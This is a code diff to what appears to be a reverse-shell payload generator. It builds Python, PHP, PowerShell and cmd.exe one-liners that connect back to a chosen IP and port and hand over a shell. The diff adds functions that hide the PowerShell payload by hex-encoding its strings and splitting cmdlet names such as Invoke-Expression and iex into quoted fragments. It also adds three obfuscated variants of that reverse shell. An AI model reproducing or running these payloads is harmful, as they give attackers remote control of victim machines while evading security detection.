@@ -1,7 +1,42 @@
 from __future__ import annotations
 
 import base64
+import random
+import re
 import subprocess
+
+def _to_ps_hex_str(s: str) -> str:
+    hex_bytes = ",".join(f"0x{b:02X}" for b in s.encode())
+    return f"([System.Text.Encoding]::UTF8.GetString([byte[]]({hex_bytes})))"
+
+def _ps_hex_obfuscate(payload: str) -> str:
+    return re.sub(r"'([^']*)'", lambda m: _to_ps_hex_str(m.group(1)), payload)
+
+_PS_CMDLETS = [
+    "Invoke-Expression",
+    "New-Object",
+    "Out-String",
+    "Get-Content",
+    "Write-Host",
+    "iex",
+    "pwd",
+]
+
+def _random_split(cmdlet: str) -> str:
+    i = random.randint(1, len(cmdlet) - 1)
+    p1, p2 = cmdlet[:i], cmdlet[i:]
+    q = random.choice(('"', "'"))
+    return f'&({q}{p1}{q}+{q}{p2}{q})'
+
+def _ps_syntax_obfuscate(payload: str) -> str:
+    result = payload
+    for cmdlet in _PS_CMDLETS:
+        result = re.sub(
+            rf'(?<![.\w]){re.escape(cmdlet)}(?![\w])',
+            lambda _, c=cmdlet: _random_split(c),
+            result,
+        )
+    return result
 
 def _get_interfaces() -> dict[str, str]:
     result = {}
@@ -58,6 +93,9 @@ $client.Close()
         "python":      f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
         "php":         f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
         "powershell":  f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+        "powershell (hex)":    _ps_hex_obfuscate(f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
+        "powershell (syntax)": _ps_syntax_obfuscate(f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
+        "powershell (hex+syntax)": _ps_hex_obfuscate(_ps_syntax_obfuscate(f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")),
         "cmd.exe":     f"powershell -nop -ep bypass -c \"{_CMD_PAYLOAD}\""
     }
 
